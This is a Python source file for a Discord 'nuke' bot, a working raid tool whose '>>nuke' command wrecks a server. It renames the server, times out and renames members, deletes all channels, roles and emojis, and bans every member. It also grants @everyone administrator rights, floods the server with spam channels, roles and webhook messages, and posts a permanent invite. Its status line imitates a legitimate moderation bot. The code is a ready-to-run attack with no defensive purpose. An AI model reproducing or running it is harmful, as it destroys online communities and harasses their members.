import asyncio
import random
import discord
from discord.ext import commands
from colorama import Fore, Style
import datetime

token = ""
SPAM_CHANNEL = [""]
SPAM_MESSAGE = [""]
WEBHOOK_NAME = ""

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
client = commands.Bot(command_prefix=">>", intents=intents)

@client.event
async def on_ready():
    print('Bot is ready.')
    await client.change_presence(activity=discord.Game(name="https://jagrosh.com/vortex"))

@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild

    try:
        with open("attached_assets/", "rb") as image:
            icon = image.read()
            await guild.edit(name="", icon=icon)
            print(Fore.MAGENTA + "Changed server name and icon" + Fore.RESET)
    except Exception as e:
        print(Fore.GREEN + f"Could not change server name/icon: {e}" + Fore.RESET)

    async def create_and_send_webhook(channel):
        try:
            webhook = await channel.create_webhook(name=WEBHOOK_NAME)
            with open("attached_assets/IMG_0135.jpeg", "rb") as image:
                webhook_icon = image.read()
                await webhook.edit(avatar=webhook_icon)
            for _ in range(10):
                await webhook.send(random.choice(SPAM_MESSAGE), username=WEBHOOK_NAME)
                await asyncio.sleep(0.5) 
            await webhook.delete()
            print(Fore.MAGENTA + f"Sent webhook messages in {channel.name}" + Fore.RESET)
        except Exception as e:
            print(Fore.GREEN + f"Webhook failed in {channel.name}: {e}" + Fore.RESET)

    async def timeout_member(member):
        try:
            if member != guild.owner and member != client.user:
                await member.timeout(duration=datetime.timedelta(days=7), reason="Raid by 時雨")
                print(Fore.MAGENTA + f"{member.name} has been timed out" + Fore.RESET)
        except:
            print(Fore.GREEN + f"Could not timeout {member.name}" + Fore.RESET)

    async def change_nick(member):
        try:
            if member != guild.owner and member != client.user:
                await member.edit(nick="")
                print(Fore.MAGENTA + f"{member.name}'s nickname was changed" + Fore.RESET)
        except:
            print(Fore.GREEN + f"Could not change {member.name}'s nickname" + Fore.RESET)

    async def delete_channel(channel):
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)

    async def create_role(i):
        try:
            await guild.create_role(name=f"NAME {i}", color=discord.Color.red())
            print(Fore.MAGENTA + f"Created role #{i}" + Fore.RESET)
        except:
            print(Fore.GREEN + f"Could not create role #{i}" + Fore.RESET)

    async def create_channels(amount):
        tasks = []
        for i in range(amount):
            tasks.append(guild.create_text_channel(random.choice(SPAM_CHANNEL)))
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"Created {amount} new channels.")

    await asyncio.gather(
        *(timeout_member(member) for member in guild.members),
        *(change_nick(member) for member in guild.members),
        *(delete_channel(channel) for channel in guild.channels),
        *(create_and_send_webhook(channel) for channel in guild.text_channels if channel != ctx.channel),
        return_exceptions=True
    )

    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=discord.Permissions.all())
        print(Fore.MAGENTA + "Gave everyone admin permissions." + Fore.RESET)
    except:
        print(Fore.GREEN + "Could not give everyone admin permissions." + Fore.RESET)

    await asyncio.gather(*(create_role(i) for i in range(50)), return_exceptions=True)
    await create_channels(50)

    async def ban_member(member):
        try:
            await member.ban()
            print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{member.name}#{member.discriminator} could not be banned." + Fore.RESET)

    async def delete_role(role):
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} has been deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} could not be deleted" + Fore.RESET)

    async def delete_emoji(emoji):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} could not be deleted" + Fore.RESET)

    await asyncio.gather(
        *(ban_member(member) for member in guild.members),
        *(delete_role(role) for role in guild.roles),
        *(delete_emoji(emoji) for emoji in guild.emojis),
        return_exceptions=True
    )

    banned_users = await guild.bans()
    async def unban_user(ban_entry):
        try:
            await guild.unban(ban_entry.user)
            print(Fore.MAGENTA + f"{ban_entry.user.name}#{ban_entry.user.discriminator} was unbanned." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{ban_entry.user.name}#{ban_entry.user.discriminator} could not be unbanned." + Fore.RESET)

    await asyncio.gather(*(unban_user(ban_entry) for ban_entry in banned_users), return_exceptions=True)

    new_channel = await guild.create_text_channel("")
    invite = await new_channel.create_invite(max_age=0, max_uses=0)
    print(f"New Invite: {invite}")
    print(f"Nuked {guild.name} successfully.")

@client.event
async def on_guild_channel_create(channel):
    for _ in range(50):
        try:
            await channel.send(random.choice(SPAM_MESSAGE))
            await asyncio.sleep(1)
        except:
            break

client.run(token)
